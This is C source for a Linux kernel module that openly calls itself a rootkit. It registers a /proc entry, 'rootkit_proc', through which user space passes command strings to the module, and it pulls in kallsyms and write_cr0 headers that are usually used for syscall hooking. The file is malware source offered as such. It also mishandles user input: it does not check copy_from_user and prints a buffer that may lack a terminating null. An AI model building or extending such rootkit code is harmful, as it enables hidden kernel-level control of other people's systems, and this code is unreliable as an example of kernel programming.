#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/uaccess.h> // copy from user
#include <linux/proc_fs.h>
#include <asm/paravirt.h> // write_cr0

#include "proc.h"

#define LONG_ORDEN 256

char orden[LONG_ORDEN];

static ssize_t write_proc(struct file* f, const char* buff, size_t len, loff_t* off){
    printk(KERN_INFO "ROOTKIT: Hi from write_proc\n");
    if (len > LONG_ORDEN)
        return -1;
    copy_from_user(orden, buff, len);
    printk(KERN_INFO "ROOTKIT: write_proc %s\n", orden);
    return len;
}

static struct file_operations proc_fops = {
    .write = write_proc
};

static int __init proc_init(void){
    return (proc_create("rootkit_proc", 0, NULL, &proc_fops) == NULL ? -1 : 0);
}

static void __exit proc_exit(void){
    remove_proc_entry("rootkit_proc", NULL);
}